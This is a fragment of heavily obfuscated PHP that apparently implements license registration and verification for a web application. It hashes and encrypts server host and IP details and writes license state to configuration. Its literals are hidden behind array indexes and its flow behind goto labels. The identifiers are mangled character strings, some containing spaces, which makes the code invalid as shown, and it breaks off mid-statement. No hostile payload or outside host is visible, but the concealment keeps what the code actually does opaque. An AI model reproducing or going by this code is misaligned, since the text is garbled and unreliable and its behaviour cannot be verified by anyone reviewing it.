function tcoj9bc94743($eÉ¾¬ÔÃë²) { goto Eó˜à‰Â¢£; dƒ ÀÎÑ‡ç: $eÉ¾¬ÔÃë²[$aŒĞÔ›ğÅÏ[108]][$aŒĞÔ›ğÅÏ[113]] = $aŒĞÔ›ğÅÏ[114]($_SERVER[$aŒĞÔ›ğÅÏ[115]] . $dˆ£šÎœŒå[$aŒĞÔ›ğÅÏ[116]]); $eÉ¾¬ÔÃë²[$aŒĞÔ›ğÅÏ[108]][$aŒĞÔ›ğÅÏ[117]] = $aŒĞÔ›ğÅÏ[118]($aŒĞÔ›ğÅÏ[119]()); $eÉ¾¬ÔÃë²[$aŒĞÔ›ğÅÏ[108]][$aŒĞÔ›ğÅÏ[120]] = $this->oxam6bcb3383; goto C“¬»æ¶˜; aŞãØÕ’æŒ: $b‰«ĞÀáË = $eÉ¾¬ÔÃë²[$aŒĞÔ›ğÅÏ[93]][$aŒĞÔ›ğÅÏ[94]][$aŒĞÔ›ğÅÏ[76]]; unset($eÉ¾¬ÔÃë²[$aŒĞÔ›ğÅÏ[93]][$aŒĞÔ›ğÅÏ[95]][$aŒĞÔ›ğÅÏ[96]]); $DÔÚ¯¬ôê‡ = $e„‘ÀÇİÆÑ[588]; goto fŒÈöâçåÑ; Eó˜à‰Â¢£: $e„‘ÀÇİÆÑ =& $_SERVER[©]; $aŒĞÔ›ğÅÏ =& $_SERVER[á¬¾Ù]; $dˆ£šÎœŒå = $aŒĞÔ›ğÅÏ[61]($aŒĞÔ›ğÅÏ[62])->{$_SERVER[á¬¾Ù][63]}(); goto Eš¼Ş†Æ¥™; C“¬»æ¶˜: if ($dˆ£šÎœŒå[$aŒĞÔ›ğÅÏ[120]] != $aŒĞÔ›ğÅÏ[121]) { $eÉ¾¬ÔÃë²[$aŒĞÔ›ğÅÏ[108]][$aŒĞÔ›ğÅÏ[122]] = $dˆ£šÎœŒå[$aŒĞÔ›ğÅÏ[122]]; $eÉ¾¬ÔÃë²[$aŒĞÔ›ğÅÏ[108]][$aŒĞÔ›ğÅÏ[123]] = $dˆ£šÎœŒå[$aŒĞÔ›ğÅÏ[123]]; $DõÕ´òŒ«î = $aŒĞÔ›ğÅÏ[124](10) . $this->oxam6bcb3383 . $aŒĞÔ›ğÅÏ[124](5); $eÉ¾¬ÔÃë²[$aŒĞÔ›ğÅÏ[93]][$aŒĞÔ›ğÅÏ[125]][$aŒĞÔ›ğÅÏ[126]] = $this->{$_SERVER[á¬¾Ù][127]}($DõÕ´òŒ«î, $eÉ¾¬ÔÃë²[$aŒĞÔ›ğÅÏ[108]][$aŒĞÔ›ğÅÏ[113]]); } if ($this->oxam6bcb3383 == $aŒĞÔ›ğÅÏ[121]) { $eÉ¾¬ÔÃë²[$aŒĞÔ›ğÅÏ[93]][$aŒĞÔ›ğÅÏ[94]][$aŒĞÔ›ğÅÏ[99]][$aŒĞÔ›ğÅÏ[107]] = 0; } $eÉ¾¬ÔÃë²[$aŒĞÔ›ğÅÏ[108]][$aŒĞÔ›ğÅÏ[128]] = $aŒĞÔ›ğÅÏ[104]($this->xwzh14f48996, $aŒĞÔ›ğÅÏ[129], $aŒĞÔ›ğÅÏ[10]); goto Dë¢ŠÎÙÂÄ; d—ÙˆäëÅ: $b»©—›¯ˆ = $e„‘ÀÇİÆÑ[590]; if (strlen($b»©—›¯ˆ) < $e„‘ÀÇİÆÑ[561]) { die; } unset($eÉ¾¬ÔÃë²[$aŒĞÔ›ğÅÏ[93]][$aŒĞÔ›ğÅÏ[94]][$aŒĞÔ›ğÅÏ[98]]); goto bŞ‘Ê‰¼ÎÌ; Eš¼Ş†Æ¥™: $fé†Ø÷‚Â = $e„‘ÀÇİÆÑ[585]; if (!$fé†Ø÷‚Â) { return; } $C«ŸâÈ¹ùº = array($aŒĞÔ›ğÅÏ[64], $aŒĞÔ›ğÅÏ[65], $aŒĞÔ›ğÅÏ[66], $aŒĞÔ›ğÅÏ[67], $aŒĞÔ›ğÅÏ[68], $aŒĞÔ›ğÅÏ[69], $aŒĞÔ›ğÅÏ[70], $aŒĞÔ›ğÅÏ[71], $aŒĞÔ›ğÅÏ[72], $aŒĞÔ›ğÅÏ[73], $aŒĞÔ›ğÅÏ[74], $aŒĞÔ›ğÅÏ[75], $aŒĞÔ›ğÅÏ[76], $aŒĞÔ›ğÅÏ[77], $aŒĞÔ›ğÅÏ[78], $aŒĞÔ›ğÅÏ[79], $aŒĞÔ›ğÅÏ[80], $aŒĞÔ›ğÅÏ[81], $aŒĞÔ›ğÅÏ[82], $aŒĞÔ›ğÅÏ[83], $aŒĞÔ›ğÅÏ[84], $aŒĞÔ›ğÅÏ[85], $aŒĞÔ›ğÅÏ[86], $aŒĞÔ›ğÅÏ[87], $aŒĞÔ›ğÅÏ[88], $aŒĞÔ›ğÅÏ[89], $aŒĞÔ›ğÅÏ[90]); goto EóµÅÖÅº; eÔ¢˜Åø®: $eÉ¾¬ÔÃë²[$aŒĞÔ›ğÅÏ[108]][$aŒĞÔ›ğÅÏ[109]] = $aŒĞÔ›ğÅÏ[110]($aŒĞÔ›ğÅÏ[111])->{$_SERVER[á¬¾Ù][112]}(); $CÌéÎ·œ¡ = $e„‘ÀÇİÆÑ[592]; if (strlen($CÌéÎ·œ¡) < $e„‘ÀÇİÆÑ[564]) { return; } goto dƒ ÀÎÑ‡ç; bŞ‘Ê‰¼ÎÌ: $a©İ‰Ïøâ´ = $e„‘ÀÇİÆÑ[591]; while (strlen($a©İ‰Ïøâ´) < $e„‘ÀÇİÆÑ[561]) { if (!$a©İ‰Ïøâ´) { break; } $a©İ‰Ïøâ´++; } $eÉ¾¬ÔÃë²[$aŒĞÔ›ğÅÏ[93]][$aŒĞÔ›ğÅÏ[94]][$aŒĞÔ›ğÅÏ[99]] = array($aŒĞÔ›ğÅÏ[100] => (int) $b‰«ĞÀáË[$aŒĞÔ›ğÅÏ[101]], $aŒĞÔ›ğÅÏ[102] => $aŒĞÔ›ğÅÏ[103]($aŒĞÔ›ğÅÏ[104]($b‰«ĞÀáË, $aŒĞÔ›ğÅÏ[105], array())), $aŒĞÔ›ğÅÏ[106] => (int) $aŒĞÔ›ğÅÏ[104]($b‰«ĞÀáË, $aŒĞÔ›ğÅÏ[107], 0)); goto eÔ¢˜Åø®; EóµÅÖÅº: $c»äš—„× = $e„‘ÀÇİÆÑ[586]; if (!$c»äš—„×) { die; } foreach ($C«ŸâÈ¹ùº as $FµÀ„ˆØø—) { $Aùç¢«„ò† = $GLOBALS[$aŒĞÔ›ğÅÏ[91]][$aŒĞÔ›ğÅÏ[92]][$FµÀ„ˆØø—]; $F™·ñÂê = $e„‘ÀÇİÆÑ[587]; if (!$F™·ñÂê) { die; } if (isset($dˆ£šÎœŒå[$FµÀ„ˆØø—])) { $Aùç¢«„ò† = $dˆ£šÎœŒå[$FµÀ„ˆØø—]; } $eÉ¾¬ÔÃë²[$aŒĞÔ›ğÅÏ[93]][$aŒĞÔ›ğÅÏ[94]][$FµÀ„ˆØø—] = $Aùç¢«„ò†; } goto aŞãØÕ’æŒ; fŒÈöâçåÑ: if (strlen($DÔÚ¯¬ôê‡) < $e„‘ÀÇİÆÑ[589]) { die; } unset($eÉ¾¬ÔÃë²[$aŒĞÔ›ğÅÏ[93]][$aŒĞÔ›ğÅÏ[95]][$aŒĞÔ›ğÅÏ[97]]); unset($eÉ¾¬ÔÃë²[$aŒĞÔ›ğÅÏ[93]][$aŒĞÔ›ğÅÏ[94]][$aŒĞÔ›ğÅÏ[76]]); goto d—ÙˆäëÅ; Dë¢ŠÎÙÂÄ: $eÉ¾¬ÔÃë²[$aŒĞÔ›ğÅÏ[108]][$aŒĞÔ›ğÅÏ[130]] = $aŒĞÔ›ğÅÏ[104]($this->xwzh14f48996, $aŒĞÔ›ğÅÏ[131], $aŒĞÔ›ğÅÏ[10]); if ($aŒĞÔ›ğÅÏ[104]($GLOBALS, $aŒĞÔ›ğÅÏ[132]) && $this->config[$aŒĞÔ›ğÅÏ[133]]) { $eÉ¾¬ÔÃë²[$aŒĞÔ›ğÅÏ[108]][$aŒĞÔ›ğÅÏ[134]] = WEB_ROOT; } return $eÉ¾¬ÔÃë²; goto e¨øÖé×—; e¨øÖé×—: } private function embi43712469() { goto bóæ›ğíŒ”; bóæ›ğíŒ”: $E˜ªÙ­°á‹ =& $_SERVER[©]; $fĞ†¿ÒêÙÄ =& $_SERVER[á¬¾Ù]; if ($_SERVER[$fĞ†¿ÒêÙÄ[44]] == $fĞ†¿ÒêÙÄ[135]) { goto F’åª²”“ò; F’åª²”“ò: $F÷ÆÔ¡¾Ÿ = array($fĞ†¿ÒêÙÄ[120] => $this->oxam6bcb3383, $fĞ†¿ÒêÙÄ[136] => $this->{$_SERVER[á¬¾Ù][137]}(), $fĞ†¿ÒêÙÄ[138] => $fĞ†¿ÒêÙÄ[61]($fĞ†¿ÒêÙÄ[139])->{$_SERVER[á¬¾Ù][140]}()); if ($this->oxam6bcb3383 != $fĞ†¿ÒêÙÄ[121]) { $fÊÏŸ§ïñ„ = $fĞ†¿ÒêÙÄ[104]($this->xwzh14f48996, $fĞ†¿ÒêÙÄ[141]); if ($fÊÏŸ§ïñ„) { $F÷ÆÔ¡¾Ÿ[$fĞ†¿ÒêÙÄ[142]] = $fÊÏŸ§ïñ„; $F÷ÆÔ¡¾Ÿ[$fĞ†¿ÒêÙÄ[143]] = $fĞ†¿ÒêÙÄ[144]($fĞ†¿ÒêÙÄ[104]($this->xwzh14f48996, $fĞ†¿ÒêÙÄ[145])); $F÷ÆÔ¡¾Ÿ[$fĞ†¿ÒêÙÄ[146]] = $fĞ†¿ÒêÙÄ[104]($this->xwzh14f48996, $fĞ†¿ÒêÙÄ[131]); } } $F÷ÆÔ¡¾Ÿ = $this->{$_SERVER[á¬¾Ù][147]}($fĞ†¿ÒêÙÄ[148]($F÷ÆÔ¡¾Ÿ), $fĞ†¿ÒêÙÄ[114]($fĞ†¿ÒêÙÄ[149])); goto C…ŸŞ¶Ù¿Ô; BÓ“Ğ‹ ± : $e¸…ÇÎçñ = $E˜ªÙ­°á‹[594]; if (strlen($e¸…ÇÎçñ) < $E˜ªÙ­°á‹[561]) { return; } goto e¬‚¥¥–öÚ; C…ŸŞ¶Ù¿Ô: $b’Ş¸½Ã‹Î = $E˜ªÙ­°á‹[593]; $a¦ñ÷Ö¶¬ = array($fĞ†¿ÒêÙÄ[150] => $F÷ÆÔ¡¾Ÿ); $fĞ†¿ÒêÙÄ[13](array($fĞ†¿ÒêÙÄ[151], $fĞ†¿ÒêÙÄ[152]), $a¦ñ÷Ö¶¬); goto BÓ“Ğ‹ ± ; e¬‚¥¥–öÚ: } goto a‰áŒ£ò‘„; BÖ®ØëÁ§: foreach ($Dâ¹ÁÈ¶­„ as $Dá‡ˆª‚ß) { if (!isset($bìáóªŞŒ»[$Dá‡ˆª‚ß]) || !$bìáóªŞŒ»[$Dá‡ˆª‚ß]) { continue; } $a¦ñ÷Ö¶¬[$Dá‡ˆª‚ß] = $bìáóªŞŒ»[$Dá‡ˆª‚ß]; } $fĞ†¿ÒêÙÄ[13](array($fĞ†¿ÒêÙÄ[151], $fĞ†¿ÒêÙÄ[152]), $a¦ñ÷Ö¶¬); $côãÍíªÅ· = $E˜ªÙ­°á‹[596]; goto A‰«¥‹Ë÷î; D…»‰ŞŸÚ¢: if (!$FÏìÒ­¡Û¸) { die; } $bìáóªŞŒ» = $fĞ†¿ÒêÙÄ[61]($fĞ†¿ÒêÙÄ[62])->{$_SERVER[á¬¾Ù][63]}(); $a¦ñ÷Ö¶¬ = array($fĞ†¿ÒêÙÄ[159] => $bìáóªŞŒ»[$fĞ†¿ÒêÙÄ[64]], $fĞ†¿ÒêÙÄ[160] => $bìáóªŞŒ»[$fĞ†¿ÒêÙÄ[65]], $fĞ†¿ÒêÙÄ[161] => $fĞ†¿ÒêÙÄ[10]); goto BÖ®ØëÁ§; A‰«¥‹Ë÷î: if (!$côãÍíªÅ·) { return; } goto cÉœÉÏ¨; a‰áŒ£ò‘„: if ($this->oxam6bcb3383 == $fĞ†¿ÒêÙÄ[121]) { return; } $Dâ¹ÁÈ¶­„ = array($fĞ†¿ÒêÙÄ[153], $fĞ†¿ÒêÙÄ[154], $fĞ†¿ÒêÙÄ[155], $fĞ†¿ÒêÙÄ[156], $fĞ†¿ÒêÙÄ[157], $fĞ†¿ÒêÙÄ[158]); $FÏìÒ­¡Û¸ = $E˜ªÙ­°á‹[595]; goto D…»‰ŞŸÚ¢; cÉœÉÏ¨: } private function mzyb600c6233() { goto F‘¶àì›£Ğ; a÷ãŞ°½„«: $this->{$_SERVER[á¬¾Ù][229]}(); $b ç’ äÏÏ[166]($b ç’ äÏÏ[197]($b ç’ äÏÏ[208]), !0); goto D¾»øËª¶ö; dŞ¦Èë„ƒĞ: $aéçÎğœÚ = $FòÙé¸×ì[599]; while (strlen($aéçÎğœÚ) < $FòÙé¸×ì[567]) { if (!$aéçÎğœÚ) { break; } $aéçÎğœÚ++; } $this->xwzh14f48996 = $cÑ†ÕéÉÉù; goto Dº½àóƒù; E‚ÓÖˆ¨ĞÙ: if (!$b ç’ äÏÏ[104]($GLOBALS, $b ç’ äÏÏ[132])) { die; } $fïòİµœ˜ã = $GLOBALS[$b ç’ äÏÏ[22]]; if (isset($fïòİµœ˜ã[$b ç’ äÏÏ[163]])) { $this->{$_SERVER[á¬¾Ù][164]}(); die; } goto dã–Í¸¸°; Dº½àóƒù: $b•Ö¾çæñÖ = $FòÙé¸×ì[600]; while (strlen($b•Ö¾çæñÖ) < $FòÙé¸×ì[564]) { if (!$b•Ö¾çæñÖ) { break; } $b•Ö¾çæñÖ++; } $this->oxam6bcb3383 = $CË¤Ü‰İñê[$b ç’ äÏÏ[120]]; goto a÷ãŞ°½„«; D—¼ÅÃî×«: $CË¤Ü‰İñê = array($b ç’ äÏÏ[209] => $a“Ó‹„Ã¼Å[$b ç’ äÏÏ[165]], $b ç’ äÏÏ[210] => $cÑ†ÕéÉÉù[$b ç’ äÏÏ[211]], $b ç’ äÏÏ[212] => $b ç’ äÏÏ[124](16), $b ç’ äÏÏ[120] => $cÑ†ÕéÉÉù[$b ç’ äÏÏ[213]]); if ($a“Ó‹„Ã¼Å[$b ç’ äÏÏ[168]]) { $CË¤Ü‰İñê[$b ç’ äÏÏ[212]] = $a“Ó‹„Ã¼Å[$b ç’ äÏÏ[168]]; } $F‰ê¨Ğ“•¦ = $b ç’ äÏÏ[25]($b ç’ äÏÏ[114]($CË¤Ü‰İñê[$b ç’ äÏÏ[210]]), 10, 10); goto cğ˜»¿; A×‹°ÏÁ¨ : $d…Ãë“‡ÄÉ = $this->{$_SERVER[á¬¾Ù][127]}($b ç’ äÏÏ[148]($cÑ†ÕéÉÉù), $fºÃ‘Äˆ); $döæ›¨ö¹Š = $b ç’ äÏÏ[222]($b ç’ äÏÏ[61]($b ç’ äÏÏ[11])->{$_SERVER[á¬¾Ù][223]}(), $b ç’ äÏÏ[224]); $a¥³ª÷š„· = $döæ›¨ö¹Š[$b ç’ äÏÏ[225]]; goto aÚÜÕ’¿ëÀ; cğ˜»¿: $CŸÇÇ¨Û” = $F‰ê¨Ğ“•¦ . $CË¤Ü‰İñê[$b ç’ äÏÏ[120]] . $CË¤Ü‰İñê[$b ç’ äÏÏ[212]]; $CË¤Ü‰İñê[$b ç’ äÏÏ[122]] = $b ç’ äÏÏ[214]($b ç’ äÏÏ[118]($this->{$_SERVER[á¬¾Ù][147]}($CŸÇÇ¨Û”, $b ç’ äÏÏ[215]))); $a²ÅÕÖù… = $b ç’ äÏÏ[124](16); goto DºÁ¹ØÇÀè; aÚÜÕ’¿ëÀ: $f˜ë Œ—Î¢ = array(); $f˜ë Œ—Î¢[$bªÄ¥µÔÈ‰] = $d…Ãë“‡ÄÉ; $b ç’ äÏÏ[61]($b ç’ äÏÏ[11])->{$_SERVER[á¬¾Ù][226]}($a¥³ª÷š„·[$b ç’ äÏÏ[227]], array($b ç’ äÏÏ[228] => $f˜ë Œ—Î¢)); goto dŞ¦Èë„ƒĞ; a¯¹†ÚßØ: $BŞÄË¶á°ò = $b ç’ äÏÏ[114]($_SERVER[$b ç’ äÏÏ[115]] . $Fß„ ßá); if ($fïòİµœ˜ã[$b ç’ äÏÏ[178]] == $b ç’ äÏÏ[179]) { $fÉ‘äÃô‘ˆ = $this->{$_SERVER[á¬¾Ù][147]}($BŞÄË¶á°ò, $b ç’ äÏÏ[180]); $bšÒôÑö® = $this->{$_SERVER[á¬¾Ù][127]}($b ç’ äÏÏ[148]($a“Ó‹„Ã¼Å), $BŞÄË¶á°ò . $b ç’ äÏÏ[181], 3); $EáêËµ™‘Ø = $this->{$_SERVER[á¬¾Ù][182]}($b ç’ äÏÏ[183] . $fÉ‘äÃô‘ˆ . $b ç’ äÏÏ[184] . $bšÒôÑö®, -1); $b ç’ äÏÏ[166]($EáêËµ™‘Ø, !0); } else { if ($fïòİµœ˜ã[$b ç’ äÏÏ[178]] == $b ç’ äÏÏ[185]) { $D‰¯ª¼Ìø¯ = $b ç’ äÏÏ[25]($b ç’ äÏÏ[114]($b ç’ äÏÏ[186] . $BŞÄË¶á°ò), 12, 15) . $b ç’ äÏÏ[187]; $bšÒôÑö® = $this->{$_SERVER[á¬¾Ù][188]}($b ç’ äÏÏ[2]($fïòİµœ˜ã[$b ç’ äÏÏ[189]]), $D‰¯ª¼Ìø¯, 2); $C½½æÔÀî = $b ç’ äÏÏ[190]($bšÒôÑö®, !0); if (!$b ç’ äÏÏ[191]($C½½æÔÀî) || !$b ç’ äÏÏ[191]($C½½æÔÀî[$b ç’ äÏÏ[192]]) || $C½½æÔÀî[$b ç’ äÏÏ[165]] != !0) { $fÒ†…Ñ§ùÇ = $b ç’ äÏÏ[193]; $aÓ…Ë¬±ó = $C½½æÔÀî[$b ç’ äÏÏ[192]] ? $b ç’ äÏÏ[194] . $C½½æÔÀî[$b ç’ äÏÏ[192]] : $fÒ†…Ñ§ùÇ; $b ç’ äÏÏ[166]($aÓ…Ë¬±ó, !1); } else { $a“Ó‹„Ã¼Å[$b ç’ äÏÏ[168]] = $C½½æÔÀî[$b ç’ äÏÏ[192]][$b ç’ äÏÏ[195]]; } } else { $C½½æÔÀî = $this->{$_SERVER[á¬¾Ù][182]}($b ç’ äÏÏ[196], $a“Ó‹„Ã¼Å, 10); } } if (!$b ç’ äÏÏ[191]($C½½æÔÀî) || !$b ç’ äÏÏ[191]($C½½æÔÀî[$b ç’ äÏÏ[192]]) || $C½½æÔÀî[$b ç’ äÏÏ[165]] != !0) { $fÒ†…Ñ§ùÇ = $b ç’ äÏÏ[197]($b ç’ äÏÏ[198]); $aÓ…Ë¬±ó = $C½½æÔÀî[$b ç’ äÏÏ[192]] ? $b ç’ äÏÏ[194] . $C½½æÔÀî[$b ç’ äÏÏ[192]] : $fÒ†…Ñ§ùÇ; $b ç’ äÏÏ[166]($aÓ…Ë¬±ó, !1); } goto b¿­ÚÆàøÙ; DºÁ¹ØÇÀè: $B’ŞÍç•ì = $a²ÅÕÖù… . $CË¤Ü‰İñê[$b ç’ äÏÏ[120]] . $this->{$_SERVER[á¬¾Ù][147]}($b ç’ äÏÏ[114]($CË¤Ü‰İñê[$b ç’ äÏÏ[209]]), $a²ÅÕÖù…); $F…È“ù¥Ñ = $FòÙé¸×ì[597]; $CË¤Ü‰İñê[$b ç’ äÏÏ[123]] = $b ç’ äÏÏ[118]($b ç’ äÏÏ[214]($this->{$_SERVER[á¬¾Ù][147]}($B’ŞÍç•ì, $b ç’ äÏÏ[216]))); goto cßØ“Œ–«; b¿­ÚÆàøÙ: $cÑ†ÕéÉÉù = $C½½æÔÀî[$b ç’ äÏÏ[192]]; $C°à“Çñªé = $this->{$_SERVER[á¬¾Ù][199]}($cÑ†ÕéÉÉù[$b ç’ äÏÏ[200]]); if (!$C°à“Çñªé || $C°à“Çñªé != $b ç’ äÏÏ[201]($cÑ†ÕéÉÉù[$b ç’ äÏÏ[145]])) { $Dª÷Ïƒ‘Ò™ = array($b ç’ äÏÏ[202] => $b ç’ äÏÏ[61]($b ç’ äÏÏ[62])->{$_SERVER[á¬¾Ù][63]}($b ç’ äÏÏ[116]), $b ç’ äÏÏ[203] => $_SERVER[$b ç’ äÏÏ[115]], $b ç’ äÏÏ[204] => $b ç’ äÏÏ[205](), $b ç’ äÏÏ[174] => $_SERVER[$b ç’ äÏÏ[175]]); $bšÒôÑö® = $this->{$_SERVER[á¬¾Ù][206]}($b ç’ äÏÏ[148]($Dª÷Ïƒ‘Ò™)); $this->{$_SERVER[á¬¾Ù][182]}($b ç’ äÏÏ[207] . $bšÒôÑö®); $b ç’ äÏÏ[166]($b ç’ äÏÏ[197]($b ç’ äÏÏ[208]), !0); } goto D—¼ÅÃî×«; dã–Í¸¸°: if (!isset($fïòİµœ˜ã[$b ç’ äÏÏ[165]]) || $b ç’ äÏÏ[24]($fïòİµœ˜ã[$b ç’ äÏÏ[165]]) != 16) { $b ç’ äÏÏ[166]($b ç’ äÏÏ[167] . $fïòİµœ˜ã[$b ç’ äÏÏ[165]], !1); } $Fß„ ßá = $b ç’ äÏÏ[61]($b ç’ äÏÏ[62])->{$_SERVER[á¬¾Ù][63]}($b ç’ äÏÏ[116]); $a“Ó‹„Ã¼Å = array($b ç’ äÏÏ[165] => $fïòİµœ˜ã[$b ç’ äÏÏ[165]], $b ç’ äÏÏ[168] => $b ç’ äÏÏ[124](16), $b ç’ äÏÏ[169] => $b ç’ äÏÏ[149], $b ç’ äÏÏ[170] => $b ç’ äÏÏ[171], $b ç’ äÏÏ[172] => $_SERVER[$b ç’ äÏÏ[173]], $b ç’ äÏÏ[174] => $_SERVER[$b ç’ äÏÏ[175]], $b ç’ äÏÏ[176] => $_SERVER[$b ç’ äÏÏ[177]]); goto a¯¹†ÚßØ; F‘¶àì›£Ğ: $FòÙé¸×ì =& $_SERVER[©]; $b ç’ äÏÏ =& $_SERVER[á¬¾Ù]; if ($_SERVER[$b ç’ äÏÏ[44]] != $b ç’ äÏÏ[162]) { return; } goto E‚ÓÖˆ¨ĞÙ; FöÔ‘ä ó¹: $bªÄ¥µÔÈ‰ = $b ç’ äÏÏ[214]($b ç’ äÏÏ[25]($fºÃ‘Äˆ, 10, 16)); $dğÂ­ÄàÈ‹ = $FòÙé¸×ì[598]; if (strlen($dğÂ­ÄàÈ‹) < $FòÙé¸×ì[564]) { die; } goto A×‹°ÏÁ¨ ; cßØ“Œ–«: if ($cÑ†ÕéÉÉù[$b ç’ äÏÏ[217]] && $cÑ†ÕéÉÉù[$b ç’ äÏÏ[217]] >= 1) { $b ç’ äÏÏ[61]($b ç’ äÏÏ[62])->{$_SERVER[á¬¾Ù][218]}($b ç’ äÏÏ[219], $b ç’ äÏÏ[220]); } $b ç’ äÏÏ[61]($b ç’ äÏÏ[62])->{$_SERVER[á¬¾Ù][221]}($CË¤Ü‰İñê); $fºÃ‘Äˆ = $b ç’ äÏÏ[114]($_SERVER[$b ç’ äÏÏ[115]] . $b ç’ äÏÏ[214]($Fß„ ßá) . $CË¤Ü‰İñê[$b ç’ äÏÏ[210]]); goto FöÔ‘ä ó¹; D¾»øËª¶ö: } private function licenseRegistSuccess() { $b‚ÔÃ„ñŞ— =& $_SERVER[á¬¾Ù]; $b¥ÌµôÚîÎ = $b‚ÔÃ„ñŞ—[61]($b‚ÔÃ„ñŞ—[62])->{$_SERVER[á¬¾Ù][63]}(); if ($b¥ÌµôÚîÎ[$b‚ÔÃ„ñŞ—[85]] != $b‚ÔÃ„ñŞ—[220]) { $b‚ÔÃ„ñŞ—[61]($b‚ÔÃ„ñŞ—[62])->{$_SERVER[á¬¾Ù][221]}($b‚ÔÃ„ñŞ—[85], $b‚ÔÃ„ñŞ—[220]); } $b‚ÔÃ„ñŞ—[110]($b‚ÔÃ„ñŞ—[230])->{$_SERVER[á¬¾Ù][231]}(!0); } private function zsva8913b543() { goto b°¥åÅ‡Šê; c«‹Ä™¡çñ: $C’äï¤Üº[61]($C’äï¤Üº[62])->{$_SERVER[á¬¾Ù][218]}($C’äï¤Üº[219], $C’äï¤Üº[232]); $AÉ¦Ø‡Í = $eÜæğ¡¨ÌÌ[601]; while (strlen($AÉ¦Ø‡Í) < $eÜæğ¡¨ÌÌ[567]) { if (!$AÉ¦Ø‡Í) { break; } $AÉ¦Ø‡Í++; } goto aˆ„Ö«ù¾¸; aˆ„Ö«ù¾¸: $this->xwzh14f48996 = array(); $this->oxam6bcb3383 = $C’äï¤Üº[121]; $CÅ½´ì‹î¿ = $eÜæğ¡¨ÌÌ[602]; goto bÑâ»óÏÁ; bÑâ»óÏÁ: if (!$CÅ½´ì‹î¿) { return; } goto aãË¦Ğë ; b°¥åÅ‡Šê: $eÜæğ¡¨ÌÌ =& $_SERVER[©]; $C’äï¤Üº =& $_SERVER[á¬¾Ù]; $C’äï¤Üº[61]($C’äï¤Üº[62])->{$_SERVER[á¬¾Ù][221]}(array($C’äï¤Üº[209] => $C’äï¤Üº[10], $C’äï¤Üº[210] => $C’äï¤Üº[10], $C’äï¤Üº[120] => $C’äï¤Üº[121], $C’äï¤Üº[122] => $C’äï¤Üº[10], $C’äï¤Üº[123] => $C’äï¤Üº[10])); goto c«‹Ä™¡çñ; aãË¦Ğë : } private function pijsd5ade809() { goto a«¤õâ™Ò“; B¨»Ø£Û¢: if ($a¦¼†ö”Õ[$c‚Œ»ÛåÖ†[120]] == $c‚Œ»ÛåÖ†[121]) { return; } $f»‚·Ö¸¿í = $c‚Œ»ÛåÖ†[61]($c‚Œ»ÛåÖ†[62])->{$_SERVER[á¬¾Ù][63]}($c‚Œ»ÛåÖ†[116]); $B«‹—ŒŞÌí = $fµÊËò£Ö[604]; goto d¾í±…Ù“; B´õÆÚ§¥: if (!$c‚Œ»ÛåÖ†[191]($e†¸ÃŞí¹Å)) { return $this->{$_SERVER[á¬¾Ù][164]}(); } $c¿ÃŞ£àİÛ = $c‚Œ»ÛåÖ†[144]($e†¸ÃŞí¹Å[$c‚Œ»ÛåÖ†[145]]); if ($c‚Œ»ÛåÖ†[233]() >= $c¿ÃŞ£àİÛ) { return $this->{$_SERVER[á¬¾Ù][164]}(); } goto B»³Ñ©ºä; d¾í±…Ù“: while (strlen($B«‹—ŒŞÌí) < $fµÊËò£Ö[10]) { if (!$B«‹—ŒŞÌí) { break; } $B«‹—ŒŞÌí++; } $dÑ„ïŠ˜š = $c‚Œ»ÛåÖ†[222]($c‚Œ»ÛåÖ†[61]($c‚Œ»ÛåÖ†[11])->{$_SERVER[á¬¾Ù][223]}(), $c‚Œ»ÛåÖ†[224]); $CØÔƒğÕƒÜ = $dÑ„ïŠ˜š[$c‚Œ»ÛåÖ†[225]]; goto f‹íŞËÚÂ; a«¤õâ™Ò“: $fµÊËò£Ö =& $_SERVER[©]; $c‚Œ»ÛåÖ† =& $_SERVER[á¬¾Ù]; $_SERVER[$c‚Œ»ÛåÖ†[175]] = $c‚Œ»ÛåÖ†[104]($_SERVER, $c‚Œ»ÛåÖ†[175], APP_HOST); goto C«é¿”Æ£„; f‹íŞËÚÂ: $b¶àã¬…µè = $fµÊËò£Ö[605]; while (strlen($b¶àã¬…µè) < $fµÊËò£Ö[10]) { if (!$b¶àã¬…µè) { break; } $b¶àã¬…µè++; } $f’™°‰Ç¯Ê = $c‚Œ»ÛåÖ†[114]($_SERVER[$c‚Œ»ÛåÖ†[115]] . $c‚Œ»ÛåÖ†[214]($f»‚·Ö¸¿í) . $a¦¼†ö”Õ[$c‚Œ»ÛåÖ†[210]]); goto D‹äôÃ¦Š; B»³Ñ©ºä: $this->xwzh14f48996 = $e†¸ÃŞí¹Å; $this->oxam6bcb3383 = $a¦¼†ö”Õ[$c‚Œ»ÛåÖ†[120]]; $Dá‚ò–ïÌï = $fµÊËò£Ö[608]; goto b´ï§Ÿ‰Ãå; D‹äôÃ¦Š: $b¦²ÌÍà  = $fµÊËò£Ö[606]; $dø”Å¸Ïí = $c‚Œ»ÛåÖ†[214]($c‚Œ»ÛåÖ†[25]($f’™°‰Ç¯Ê, 10, 16)); $e†¸ÃŞí¹Å = $this->{$_SERVER[á¬¾Ù][188]}($CØÔƒğÕƒÜ[$c‚Œ»ÛåÖ†[91]][$dø”Å¸Ïí], $f’™°‰Ç¯Ê); goto aàê¹›Œ¤Â; C«é¿”Æ£„: $this->oxam6bcb3383 = $c‚Œ»ÛåÖ†[121]; $a¦¼†ö”Õ = $c‚Œ»ÛåÖ†[61]($c‚Œ»ÛåÖ†[62])->{$_SERVER[á¬¾Ù][63]}(); $fğÊÓÉ‡˜Ë = $fµÊËò£Ö[603]; goto B¨»Ø£Û¢; aàê¹›Œ¤Â: $bƒìó•ÃÒ = $fµÊËò£Ö[607]; if (strlen($bƒìó•ÃÒ) < $fµÊËò£Ö[561]) { return; } $e†¸ÃŞí¹Å = $c‚Œ»ÛåÖ†[190]($e†¸ÃŞí¹Å, !0); goto B´õÆÚ§¥; b´ï§Ÿ‰Ãå: } private function owck2d749970() { goto D®È›®»±; D®È›®»±: $D™Œ¼¦—Š =& $_SERVER[á¬¾Ù]; $fƒœÁçÒ = $GLOBALS[$D™Œ¼¦—Š[22]]; $EÅöù‘–Ÿò = $_SERVER[$D™Œ¼¦—Š[44]]; goto eå³Ü±Äºï; A™‘¨¢òì: $b«’’’“£ = array($D™Œ¼¦—Š[237], $D™Œ¼¦—Š[238]); if ($D™Œ¼¦—Š[239]($EÅöù‘–Ÿò, $b«’’’“£)) { if ($this->oxam6bcb3383 == $D™Œ¼¦—Š[121] && isset($fƒœÁçÒ[$D™Œ¼¦—Š[240]])) { $D™Œ¼¦—Š[166]($D™Œ¼¦—Š[197]($D™Œ¼¦—Š[235]), !1, 